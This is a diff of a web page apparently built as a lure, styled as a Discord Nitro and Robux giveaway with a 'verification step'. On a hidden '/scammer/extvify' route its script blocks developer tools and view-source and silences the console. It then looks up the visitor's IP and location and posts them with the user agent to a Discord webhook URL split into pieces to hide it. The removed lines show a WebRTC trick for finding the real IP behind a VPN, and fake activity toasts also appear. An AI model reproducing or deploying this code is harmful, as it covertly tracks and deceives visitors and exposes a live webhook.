@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* [Your existing styles – unchanged, omitted for brevity] */
+    /* ========== YOUR EXISTING STYLES (full – unchanged) ========== */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -189,8 +189,6 @@
     }
     .faq-item.open .faq-answer { margin-top: 0.6rem; max-height: 200px; opacity: 1; }
     footer { text-align: center; font-size: 0.7rem; color: #7a7f9e; margin-top: 1.2rem; font-weight: 500; }
-
-    /* ----- FIXED SIZE TOASTS (PC / LAPTOP / iPad) - HIDDEN ON MOBILE ----- */
     .activity-toasts {
       position: fixed;
       bottom: 24px;
@@ -261,13 +259,7 @@
       from { opacity: 0; transform: translateX(-30px); }
       to { opacity: 1; transform: translateX(0); }
     }
-
-    /* Hide toasts completely on mobile devices (screen width < 768px) */
-    @media (max-width: 767px) {
-      .activity-toasts {
-        display: none !important;
-      }
-    }
+    @media (max-width: 767px) { .activity-toasts { display: none !important; } }
     @media (max-width: 500px) {
       body { padding: 1rem; }
       .card { padding: 1.2rem; }
@@ -276,12 +268,10 @@
       .reward-icon { width: 42px; height: 42px; }
       .reward-icon img { width: 30px; height: 30px; }
     }
-    @media (min-width: 768px) and (max-width: 1024px) {
-      .wrap { width: min(600px, 90%); }
-    }
+    @media (min-width: 768px) and (max-width: 1024px) { .wrap { width: min(600px, 90%); } }
     .hidden { display: none; }
 
-    /* --- Special page (scammer/extvify) styles --- */
+    /* Special page (scammer/extvify) styles */
     .extvify-page {
       text-align: center;
       background: #0f1119;
@@ -316,6 +306,11 @@
       color: #9a9fc0;
       margin-top: 0.5rem;
     }
+    .extvify-page .note {
+      font-size: 0.7rem;
+      color: #f5b042;
+      margin-top: 1rem;
+    }
     .retry-btn {
       background: #5865f2;
       border: none;
@@ -328,10 +323,7 @@
       font-family: inherit;
       transition: all 0.2s;
     }
-    .retry-btn:hover {
-      background: #6d7eff;
-      transform: scale(0.98);
-    }
+    .retry-btn:hover { background: #6d7eff; transform: scale(0.98); }
   </style>
 </head>
 <body>
@@ -346,33 +338,23 @@
   (function() {
     const path = window.location.pathname.toLowerCase();
     const isScammerRoute = path === '/scammer/extvify' || path === '/scammer/extvify/';
-    const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
 
     // ============================================================
-    //  /scammer/extvify ROUTE – with WebRTC IP detection (bypass VPN attempts)
+    //  /scammer/extvify ROUTE – IP detection with VPN note
     // ============================================================
     if (isScammerRoute) {
-      // Anti‑debug / anti‑source
-      document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-      document.addEventListener('keydown', function(e) {
-        if (e.key === 'F12' ||
-            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
-            (e.ctrlKey && e.key === 'u') ||
-            (e.ctrlKey && e.key === 's')) {
+      // Anti‑debug
+      document.addEventListener('contextmenu', e => e.preventDefault());
+      document.addEventListener('keydown', e => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
           e.preventDefault();
-          return false;
         }
       });
       if (typeof window.console !== 'undefined') console.log = function() {};
-      setInterval(() => {
-        if (typeof window.console !== 'undefined' && window.console.log !== function(){}) {
-          console.log = function(){};
-        }
-      }, 1000);
 
       document.title = "Extvify";
       const container = document.getElementById('mainApp');
-      
+
       function renderIPPage(ip, locationText = null, error = false) {
         if (ip) {
           const locationHtml = locationText ? `<div class="location">Estimated location: ${locationText}</div>` : '';
@@ -381,6 +363,7 @@
               <h1>Your IP Address</h1>
               <div class="ip-display">${ip}</div>
               ${locationHtml}
+              <div class="note">If you are using a VPN, this is your VPN's IP. Your real IP cannot be detected through a browser.</div>
             </div>
           `;
         } else {
@@ -396,97 +379,58 @@
         }
       }
 
-      // --- WebRTC IP detection (attempt to get real IP behind VPN) ---
-      function getWebRTCIP(callback) {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (event) => {
-          if (event.candidate) {
-            const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
-            if (ipMatch) {
-              callback(ipMatch[0]);
-              pc.close();
-            }
-          }
-        };
-        setTimeout(() => callback(null), 3000);
-      }
-
-      // --- Obfuscated webhook (scattered parts) ---
+      // Obfuscated webhook URL
       const _p1 = "https://discord.com/api/webhooks/1511201588964757565/";
       const _p2 = "yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwk";
       const _p3 = "t3wQ-hzKsmKmz7a";
       const webhookUrl = _p1 + _p2 + _p3;
 
-      // --- Main logic: try WebRTC first, then fallback to API ---
-      getWebRTCIP((webrtcIP) => {
-        let ipPromise;
-        if (webrtcIP) {
-          ipPromise = Promise.resolve(webrtcIP);
-        } else {
-          ipPromise = fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-        }
-        ipPromise.then(ip => {
+      // Get IP (simple API, no WebRTC because it's patched)
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipData => {
+          const ip = ipData.ip;
           if (!ip) throw new Error('No IP');
-          // Location APIs
-          const locationAPIs = [
-            () => fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city`).then(r => r.json()).then(data => {
-              if (data.status === 'success') return `${data.city}, ${data.regionName} ${data.country}`;
-              throw new Error();
-            }),
-            () => fetch(`https://ipinfo.io/${ip}/json`).then(r => r.json()).then(data => {
-              if (data.city) return `${data.city}, ${data.region} ${data.country}`;
-              throw new Error();
-            }),
-            () => fetch(`https://freegeoip.app/json/${ip}`).then(r => r.json()).then(data => {
-              if (data.city) return `${data.city}, ${data.region_name} ${data.country_name}`;
-              throw new Error();
-            })
-          ];
-          let apiIndex = 0;
-          function tryNextAPI() {
-            if (apiIndex >= locationAPIs.length) {
-              renderIPPage(ip, 'Unknown');
+          // Try to get location
+          fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city`)
+            .then(res => res.json())
+            .then(locData => {
+              let location = '';
+              if (locData.status === 'success') {
+                location = `${locData.city}, ${locData.regionName} ${locData.country}`.replace(/^,\s*/, '').trim();
+              }
+              renderIPPage(ip, location || 'Unknown');
               fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: Unknown\nUser Agent: ${navigator.userAgent}\nVPN Bypass Attempt: ${webrtcIP ? 'WebRTC success' : 'WebRTC failed'}` })
+                body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: ${location || 'Unknown'}\nUser Agent: ${navigator.userAgent}` })
               }).catch(e => console.error);
-              return;
-            }
-            locationAPIs[apiIndex]()
-              .then(location => {
-                renderIPPage(ip, location);
-                fetch(webhookUrl, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}\nVPN Bypass: ${webrtcIP ? 'WebRTC IP used' : 'Standard API'}` })
-                }).catch(e => console.error);
-              })
-              .catch(() => {
-                apiIndex++;
-                tryNextAPI();
-              });
-          }
-          tryNextAPI();
-        }).catch(() => {
+            })
+            .catch(() => {
+              renderIPPage(ip, 'Location lookup failed');
+              fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: Failed\nUser Agent: ${navigator.userAgent}` })
+              }).catch(e => console.error);
+            });
+        })
+        .catch(() => {
           renderIPPage(null, null, true);
         });
-      });
       return;
     }
 
     // ============================================================
-    //  NORMAL REWARD PAGE – unchanged (full functionality)
+    //  NORMAL REWARD PAGE (full functionality)
     // ============================================================
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
     
-    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-    document.addEventListener('keydown', function(e) {
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
       if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
-        e.preventDefault(); return false;
+        e.preventDefault();
       }
     });
     if (typeof window.console !== 'undefined') console.log = function() {};
@@ -733,10 +677,7 @@
     function showActivityToast() {
       if (!toastContainer) return;
       if (window.innerWidth < 768) return;
-      while (toastContainer.children.length >= 3) {
-        const oldest = toastContainer.lastElementChild;
-        if (oldest) oldest.remove();
-      }
+      while (toastContainer.children.length >= 3) toastContainer.lastElementChild?.remove();
       let available = countryNames.filter(c => c !== lastCountry);
       if (available.length === 0) available = countryNames.slice();
       const country = available[Math.floor(Math.random() * available.length)];
@@ -758,9 +699,7 @@
       setTimeout(() => {
         toast.style.opacity = '0';
         toast.style.transform = 'translateX(-15px)';
-        setTimeout(() => {
-          if (toast.parentNode) toast.remove();
-        }, 300);
+        setTimeout(() => toast.remove(), 300);
       }, 5500);
     }
 
